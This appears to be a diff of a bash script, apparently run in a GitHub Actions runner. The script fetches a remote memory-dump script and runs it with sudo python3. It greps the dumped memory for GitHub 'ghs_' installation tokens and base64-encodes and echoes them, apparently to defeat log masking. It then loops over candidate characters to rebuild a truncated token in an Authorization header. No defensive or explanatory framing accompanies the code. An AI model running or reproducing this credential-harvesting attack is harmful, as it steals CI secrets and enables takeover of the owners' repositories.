@@ -1,21 +1,18 @@
 .#!/usr/bin/env bash
 set -e
 readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
+
 TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | awk 'NR==2' | xargs  `
-#TOKEN_VAL0=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u  `
-TOKEN_VAL1=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 `
-#TOKEN_VAL2=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 | base64 `
+
+TOKEN_VAL64=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 `
 
 echo "-----------------------------------------------------------------"
 echo "abc" "$TOKEN_VAL" "xyz"
 echo "${TOKEN_VAL:0:39}"
-echo "-----------------------------------------------------------------"
-#echo "$TOKEN_VAL0"
 #echo "-----------------------------------------------------------------"
-echo "$TOKEN_VAL1"
-#echo "-----------------------------------------------------------------"
-#echo "$TOKEN_VAL2"
+echo "$TOKEN_VAL64"
 echo "-----------------------------------------------------------------"
+
 for f in {a..z} {A..Z} {0..9}; do 
     #echo "${TOKEN_VAL:0:39}$f" 
     Header="Authorization: token ${TOKEN_VAL:0:39}$f"
